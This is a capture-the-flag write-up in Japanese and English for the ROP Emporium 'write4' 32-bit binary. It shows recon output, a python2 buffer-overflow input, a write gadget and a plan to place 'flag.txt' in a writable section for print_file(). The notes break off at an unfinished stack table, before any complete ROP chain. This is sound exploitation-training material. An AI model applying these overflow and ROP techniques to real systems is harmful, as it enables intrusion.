# write4

## Description

```
Our first foray into proper gadget use.
A useful function is still present, but we'll need to write a string into memory somehow.

Click below to download the binary:
https://ropemporium.com/binary/write432.zip
```

### Cord cut

On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string `"/bin/cat flag.txt"` is not present this time. Although you'll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we'll stick to the challenge goal which is learning how to get data into the target process's virtual address space via the magic of ROP.

### Differences

Things have been rearranged a little for this challenge; the printing logic has been moved into a separate library in an attempt to mitigate the alternate solution that is possible in the callme challenge. The stack smash also takes place in a function within that library, but don't worry this will have no effect on your ROP chain.

### Important

A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

### Read/Write

Hopefully you've realised that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won't be using built-in functionality since that's too similar to the previous challenges, instead we'll be looking for gadgets that let us write a value to memory such as `mov [reg], reg`.

### What/Where

Perhaps the most important thing to consider in this challenge is **where** we're going to write our `"flag.txt"` string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Consider how much space each section might give you to work with and whether corrupting the information stored at these locations will cause you problems later if you need some kind of stability from this program.

### Decisions, decisions

Once you've figured out how to write your string into memory and where to write it, go ahead and call `print_file()` with its location as its only argument. You could consider wrapping your write gadgets in helper a function; if you can write a 4 or 8 byte value to a location in memory, you could craft a function (e.g. in Python using pwntools) that takes a string and a memory location and returns a ROP chain that will write that string to your chosen location. Crafting templates like this will make your life much easier in the long run. As ever, with the MIPS challenge don't forget about the branch delay slot.

## Solution

### 表層解析

```
write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
```

```
✦ ❯ checksec --file=write432 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68) Symbols	  No	0		0	write432

```

```
❯ nm write432 
0804a020 B __bss_start
0804a020 b completed.7283
0804a018 D __data_start
0804a018 W data_start
08048450 t deregister_tm_clones
08048430 T _dl_relocate_static_pie
080484d0 t __do_global_dtors_aux
08049f00 d __do_global_dtors_aux_fini_array_entry
0804a01c D __dso_handle
08049f04 d _DYNAMIC
0804a020 D _edata
0804a024 B _end
080485b4 T _fini
080485c8 R _fp_hw
08048500 t frame_dummy
08049efc d __frame_dummy_init_array_entry
08048730 r __FRAME_END__
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
080485dc r __GNU_EH_FRAME_HDR
0804837c T _init
08049f00 d __init_array_end
08049efc d __init_array_start
080485cc R _IO_stdin_used
080485b0 T __libc_csu_fini
08048550 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048506 T main
         U print_file
         U pwnme
08048490 t register_tm_clones
080483f0 T _start
0804a020 D __TMC_END__
0804852a t usefulFunction
08048543 t usefulGadgets
08048440 T __x86.get_pc_thunk.bx

```

なんかDescriptionを見て見るに、今回は/bin/cat flag.txtという文字がないので自分で入力したやつをどっかしらのメモリに入れる必要がありそう。

#### 怪しいところ

* pwnme
* usefulFunciton
* usefulGadgets
* print_file

### 動的解析　

```
❯ ./write432 
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> werwr
Thank you!
```





まぁいつもどおり、pwnmeにスタックベースのバッファオーバフローの脆弱性がありそうなので見ていく.

```
❯ python2 -c "print 'A' * 44 + '\xb0\x83\x04\x08'" | ./write432
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> Thank you!
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> Thank you!
fish: Process 105826, './write432' from job 1, 'python2 -c "print 'A' * 44 + '\…' terminated by signal SIGSEGV (Address boundary error)
```

なんかよく分からんが、

print_fileに飛ばしてあげようか

print_file()の疑似コードはこんな感じになると思う　

```
print_file(filename){
	print(open(fllename,"r"))
}
```

なのでいいかんじにprint_fileにfilenameを渡してあげなきゃいけない。

どっかしらの場所に"flag.txt" を挿入しなきゃだめなので、

書き込み可能領域を探してあげる。

```
✦ ❯ readelf -S write432
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048324 000324 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485b4 0005b4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485dc 0005dc 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048620 000620 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)

```

```
gef➤  disas usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048545 <+2>:	ret    
   0x08048546 <+3>:	xchg   ax,ax
   0x08048548 <+5>:	xchg   ax,ax
   0x0804854a <+7>:	xchg   ax,ax
   0x0804854c <+9>:	xchg   ax,ax
   0x0804854e <+11>:	xchg   ax,ax
End of assembler dump.
gef➤  

```

あとは、usefulFadgetsに書き込みが可能になるようなGadgetがあるからそれ使っていくぜい。

一旦スタックの情報をまとめとく。

| アドレス                    | 値             |
| --------------------------- | -------------- |
| esp#pwnme  ebp#pwnme - 0x28 |                |
| ebp#pwnme                   | ...            |
| ebp#pwnme+0x4               | return address |
| ebp#pwnme                   |                |
|                             |                |
|                             |                |
|                             |                |
|                             |                |
|                             | AAAAAAAAAAAA   |

 
